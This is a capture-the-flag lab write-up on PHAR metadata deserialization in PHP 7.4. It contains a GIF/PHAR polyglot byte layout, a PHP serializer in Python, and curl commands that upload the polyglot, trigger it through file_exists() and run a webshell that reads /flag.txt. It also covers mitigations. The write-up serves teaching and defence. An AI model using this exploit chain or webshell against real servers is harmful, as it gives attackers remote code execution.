# 14 — PHAR deserialization: `file_exists()` is an `unserialize()` — Writeup

## TL;DR

On PHP ≤ 7.4 the `phar://` stream wrapper unserializes the archive's
`metadata` field as soon as PHP parses the archive — and it parses the archive
for *any* stream operation, including `file_exists()`. Build a GIF/PHAR
polyglot (PHP finds the manifest by scanning for `__HALT_COMPILER();`, so a
13-byte GIF header in front of it is fine), get it past the image validator,
then `GET /check.php?file=phar://uploads/<sha1>.gif/note.txt`. The metadata is
a `ThumbnailCache` whose `__destruct` writes a webshell into the gallery's
cache directory.

## The bug

`check.php` in full:

```php
<?php
require __DIR__ . '/lib/gallery.php';

file_exists($_GET['file'] ?? '');
```

There is no include, no echo, no eval. The vulnerability is entirely in what
PHP does behind `file_exists()`.

### Why a stat() call deserializes

`file_exists()` resolves its argument through the stream layer
(`php_stream_url_wrap_*`), which picks a wrapper from the `scheme://` prefix.
For `phar://`, `phar_wrapper_stat()` has to answer "does this entry exist
inside the archive?", which means opening and parsing the archive first
(`phar_open_from_filename` → `phar_parse_pharfile`). Part of parsing is:

```c
/* ext/phar/phar.c, phar_parse_pharfile() -- PHP 7.4 */
if (mydata->metadata_len) {
    ...
    if (phar_parse_metadata(&buffer, &mydata->metadata, ...) == FAILURE) {
```

and `phar_parse_metadata()` is a thin wrapper around `php_var_unserialize()`.
The archive author controls those bytes, so the archive author controls an
`unserialize()` call — and therefore `__wakeup()`, `__destruct()`,
`__toString()`, `offsetGet()` and friends on every class the current request
has loaded.

That is the whole point of the technique: it breaks the assumption that only a
literal `unserialize()` is dangerous. `file_exists`, `filesize`, `is_dir`,
`is_file`, `file_get_contents`, `copy`, `md5_file`, `getimagesize`,
`fopen`, `unlink`, … all reach it.

PHP 8.0 removed the automatic deserialization
([RFC: "don't automatically unserialize Phar metadata"](https://wiki.php.net/rfc/phar_stop_autoloading_metadata)),
which is why this lab is pinned to **php:7.4.33-apache**.

### The gadget chain

`lib/gallery.php` is loaded by `check.php`, so both of its classes are
available to the deserializer:

```php
class ImageNote {
    public $width = 0, $height = 0, $note = '';
    public function __toString() {
        return "<!-- {$this->width}x{$this->height} -->" . $this->note;
    }
}

class ThumbnailCache {
    public $name;
    public $content = null;
    public function __destruct() {
        if ($this->content !== null && $this->name !== null) {
            file_put_contents(CACHE_DIR . '/' . $this->name, (string) $this->content);
        }
    }
}
```

`__destruct()` runs when the deserialized object is collected at the end of
the request — nobody has to call anything. `(string) $this->content` invokes
`ImageNote::__toString()`, which concatenates an attacker-controlled `note`.
So the chain is:

```
unserialize(metadata)
  └─ ThumbnailCache::__destruct()
       └─ file_put_contents(data/<name>, (string) <content>)
            └─ ImageNote::__toString()   -> "<!-- 1x1 --><?php ... ?>"
```

`CACHE_DIR` is `/var/www/html/data`, which Apache serves and PHP executes.

## Building the exploit

### 1. The PHAR format, byte by byte

`solve/solve.py` writes the archive from scratch. Layout
(`ext/phar/phar.c`, `phar_open_from_fp` / `phar_parse_pharfile`):

```
 ┌────────────────────────────────────────────────────────────────────────┐
 │ anything at all (our GIF header)                                       │  \
 │ ... stub ... __HALT_COMPILER(); ?>\r\n                                 │   } found by scanning
 ├────────────────────────────────────────────────────────────────────────┤  /
 │ uint32 LE  manifest length      (everything below, up to file entries) │
 │ uint32 LE  number of files                                             │
 │ uint16 BE  api version          0x1100 = 1.1.0                         │
 │ uint32 LE  global flags         0x00010000 = a signature follows       │
 │ uint32 LE  alias length      + alias bytes                             │
 │ uint32 LE  metadata length   + serialized metadata   <=== unserialize()│
 │ per file:                                                              │
 │   uint32 LE  filename length + filename                                │
 │   uint32 LE  uncompressed size                                         │
 │   uint32 LE  mtime                                                     │
 │   uint32 LE  compressed size                                           │
 │   uint32 LE  CRC-32 of the uncompressed content                        │
 │   uint32 LE  flags  (low 12 bits: permissions; 0xF000: compression)    │
 │   uint32 LE  per-file metadata length + bytes                          │
 ├────────────────────────────────────────────────────────────────────────┤
 │ file contents, concatenated in manifest order                          │
 ├────────────────────────────────────────────────────────────────────────┤
 │ signature   (SHA-1 = 20 bytes) over *everything above*                 │
 │ uint32 LE   signature type  1=MD5 2=SHA1 4=SHA256 8=SHA512 16=OpenSSL  │
 │ "GBMB"      magic trailer                                              │
 └────────────────────────────────────────────────────────────────────────┘
```

An illustrative 276-byte polyglot, annotated. It is a smaller payload than
the solver's own 323-byte archive so the layout fits on one screen; the
field order and semantics are identical:

```
00000000  47 49 46 38 39 61 01 00  01 00 00 00 00           GIF89a + 1x1 + flags   <- getimagesize() reads only this
0000000d  3c 3f 70 68 70 20 5f 5f  48 41 4c 54 5f 43 4f 4d   "<?php __HALT_COM
0000001d  50 49 4c 45 52 28 29 3b  20 3f 3e 0d 0a             PILER(); ?>\r\n"    <- PHP scans for this token
0000002a  c8 00 00 00                                         manifest length = 200
0000002e  01 00 00 00                                         1 file
00000032  11 00                                               api version 1.1.0
00000034  00 00 01 00                                         global flags = 0x00010000 (signed)
00000038  00 00 00 00                                         alias length = 0
0000003c  95 00 00 00                                         metadata length = 149
00000040  4f 3a 31 34 3a 22 54 68  75 6d 62 6e 61 69 6c ...   O:14:"ThumbnailCache":2:{...}
000000d5  05 00 00 00 61 2e 74 78  74                         "a.txt"
000000de  02 00 00 00 00 00 00 00  02 00 00 00               size 2, mtime 0, csize 2
000000ea  ac 2a 93 d8                                         CRC-32("hi")
000000ee  b6 01 00 00                                         flags = 0666
000000f2  00 00 00 00                                         no per-file metadata
000000f6  68 69                                               file contents: "hi"
000000f8  0d 83 96 f8 ... af 30                               SHA-1 of bytes 0x00..0xf7
0000010c  02 00 00 00                                         signature type 2 (SHA-1)
00000110  47 42 4d 42                                         "GBMB"
```

Two details matter in practice:

* **`phar.require_hash` defaults to `1`**, so an archive without a valid
  signature is rejected. Hence the SHA-1 and the `0x00010000` global flag. The
  signature covers everything from offset 0 up to (not including) the
  signature itself — the GIF header included.
* **`phar.readonly` defaults to `1`**, which is why you cannot just use PHP's
  own `Phar` class to build the payload on a hardened box. It has no effect on
  *reading*, which is the whole problem.

The serializer is 20 lines of Python:

```python
def php_serialize(v):
    if v is None:            return b"N;"
    if isinstance(v, bool):  return b"b:%d;" % int(v)
    if isinstance(v, int):   return b"i:%d;" % v
    if isinstance(v, bytes): return b's:%d:"%s";' % (len(v), v)
    if isinstance(v, PhpObject):
        body = b"".join(php_serialize(k) + php_serialize(x) for k, x in v.props.items())
        return b'O:%d:"%s":%d:{%s}' % (len(v.cls), v.cls.encode(), len(v.props), body)
```

(Only public properties are needed here. `protected` would be
`\0*\0name` and `private` `\0Class\0name`.)

### 2. Getting past the image validation

`upload.php` checks three things:

```php
$ext  = strtolower(pathinfo($_FILES['image']['name'], PATHINFO_EXTENSION));  // .gif/.jpg/.jpeg
$head = file_get_contents($tmp, false, null, 0, 6);                          // GIF87a/GIF89a/FFD8FF
$info = @getimagesize($tmp);                                                 // and the parser agrees
```

All three pass on a 13-byte GIF header:

```
47 49 46 38 39 61   "GIF89a"
01 00               width  = 1   (uint16 LE)
01 00               height = 1
00                  packed fields: no global colour table
00                  background colour index
00                  pixel aspect ratio
```

`getimagesize()` never looks for image *data*, so nothing else is needed. A
JPEG polyglot works the same way and is tested too — `FF D8 FF E0` plus a JFIF
APP0 segment plus a 13-byte `SOF0` marker (`getimagesize()` needs the SOF to
report dimensions), 33 bytes of prefix instead of 13. Re-encoding the upload (`imagecreatefromgif()` +
`imagegif()`) would destroy the archive — that is the one upload-side check
that would actually have helped.

### 3. Firing it

```sh
curl -s -F 'image=@poly.gif' http://127.0.0.1:8014/upload.php
# stored: uploads/b1f0329...b72c.gif
# size:   1x1

curl -s -G http://127.0.0.1:8014/check.php \
     --data-urlencode 'file=phar://uploads/b1f0329...b72c.gif/note.txt'
# (nothing, as always)

curl -s -G http://127.0.0.1:8014/data/shell.php --data-urlencode 'c=cat /flag.txt'
# <!-- 1x1 -->PHRACK{phar_metadata_turns_file_exists_into_unserialize}
```

Note the path inside the archive (`/note.txt`) does not have to exist —
`file_exists()` returning `false` is fine, the metadata has already been
deserialized by then. Relative paths work because Apache's working directory
is the document root.

## The exploit

`solve/solve.py`, Python 3 standard library only:

| stage | function |
|-------|----------|
| PHP serialization | `php_serialize()` / `PhpObject` |
| PHAR writer + SHA-1 signature | `build_phar()` |
| GIF header | `gif_header()` |
| multipart upload | `post_file()` (hand-rolled, no `requests`) |
| trigger + shell | `main()` |

Output of a real run:

```
[*] target http://challenge
[*] gadget chain: ThumbnailCache::__destruct -> file_put_contents(data/s5d2158a5.php, ImageNote::__toString())
[*] polyglot: 323 bytes, starts with b'GIF89a', metadata is 189 bytes of serialized PHP
[*] uploaded as uploads/b1f032971fe8527b83440715a2eae8aa7ec5b72c.gif
[*] triggered file_exists(phar://uploads/b1f0329....gif/note.txt)
[*] RCE as uid=33(www-data) gid=33(www-data) groups=33(www-data)
FLAG: PHRACK{phar_metadata_turns_file_exists_into_unserialize}
```

The whole thing is 4 HTTP requests and finishes in well under a second.

## Fixing it

`make mitigations` runs all four cases in throwaway containers. Results:

| configuration | `file_exists('phar://poc.gif/x')` | `__destruct` fires? |
|---|---|---|
| PHP 7.4.33, stock | `true` | **yes** |
| PHP 7.4.33, `phar.readonly=1` (the default!) | `true` | **yes** |
| PHP 7.4.33 + `stream_wrapper_unregister('phar')` | `false` | no |
| PHP 8.2.33 | `true` | no |

So:

* **Upgrade.** PHP ≥ 8.0 no longer unserializes the metadata automatically
  (RFC linked above). This is the real fix and it is why the technique is
  mostly of historical interest today — except on the very large amount of
  code still running 7.x.
* **`stream_wrapper_unregister('phar')`** at the start of the request kills the
  primitive outright on old versions. Do the same for any other wrapper the
  application does not need (`data`, `expect`, `php` when user input can reach
  a stream function). This is the only reliable 7.x mitigation.
* **`phar.readonly=1` is not a mitigation.** It only forbids *creating* phars
  from PHP; reading one is always allowed. A lot of hardening guides get this
  wrong.
* **Do not let user input choose the wrapper.** In this app:

  ```php
  $name = basename($_GET['file'] ?? '');
  $path = __DIR__ . '/uploads/' . $name;
  if (strpos($name, "\0") === false && is_file($path)) { ... }
  ```

  A `basename()` plus a fixed directory removes the `scheme://` prefix
  entirely. Checking for `stripos($p, 'phar://') === 0` is *not* enough:
  the wrapper can also be reached through `compress.zlib://phar://…` and
  friends.
* **Re-encode uploads.** `imagecreatefromgif()` + `imagegif()` (or ImageMagick)
  destroys everything after the image data, so the archive never lands on disk
  in the first place. Storing uploads outside the document root helps with
  other bugs but not with this one — the path only has to be *readable*.

## Going further

* **Real-world sinks.** Sam Thomas exploited TCPDF, Typo3 and WordPress this
  way; `getimagesize()` on a user-supplied "image URL" is the classic one.
  Lab `15-mpdf-phar-killchain` in this repo builds the mPDF variant Orange
  describes (`<img src="phar://…">`), including @Cyku's trick of smuggling the
  archive through mPDF's own data-URI cache.
* **Compression.** Entries may be gzip/bzip2 compressed (global flags
  `0x1000`/`0x2000` and per-file flags); the metadata itself never is.
* **Other archive fields.** Per-file metadata is deserialized too, when the
  entry is actually accessed — useful when the manifest-level metadata is
  stripped by some sanitizer.
* **Other polyglot hosts.** Anything whose parser tolerates trailing data:
  JPEG (APP0 comment), PNG (a `tEXt` chunk), PDF, ZIP, even a `.docx`.
* **Finding chains.** `phpggc` ships ready-made POP chains for Laravel,
  Symfony, Monolog, Guzzle, …, and can emit them directly as a PHAR
  (`phpggc -p phar ...`).

## Known limitations of this lab

* The gadget chain is deliberately short and lives in the application's own
  code. Real targets need a framework chain; finding one is a separate
  exercise.
* `data/` is web-exposed and PHP-executable so that the write primitive is
  immediately RCE. A more realistic target would need a second step (log
  poisoning, overwriting a config file, `.htaccess`…).
* The lab does not demonstrate the `phar://` alias/`.phar` extension subtleties
  or `Phar::interceptFileFuncs()`; it sticks to the plain wrapper.

## References

* Orange Tsai, *"The Art of PHP - My CTF Journey and Untold Stories!"*,
  Phrack #72, section 4.2 "PHAR Deserialization / Level 0 - What is PHAR?".
* Orange Tsai, HITCON CTF 2017 *"Baby^H Master PHP 2017"*:
  <https://github.com/orangetw/My-CTF-Web-Challenges>
* Sam Thomas, *"It's a PHP Unserialization Vulnerability Jim, but Not as We
  Know It"*, Black Hat USA 2018:
  <https://i.blackhat.com/us-18/Thu-August-9/us-18-Thomas-It's-A-PHP-Unserialization-Vulnerability-Jim-But-Not-As-We-Know-It.pdf>
* PHP RFC, *"don't automatically unserialize Phar metadata"*:
  <https://wiki.php.net/rfc/phar_stop_autoloading_metadata>
* PHP manual, PHAR file format:
  <https://www.php.net/manual/en/phar.fileformat.php>
* PHP source: `ext/phar/phar.c` (`phar_parse_pharfile`, `phar_parse_metadata`)
  and `ext/phar/stream.c` (`phar_wrapper_stat`).
* `phpggc`: <https://github.com/ambionics/phpggc>
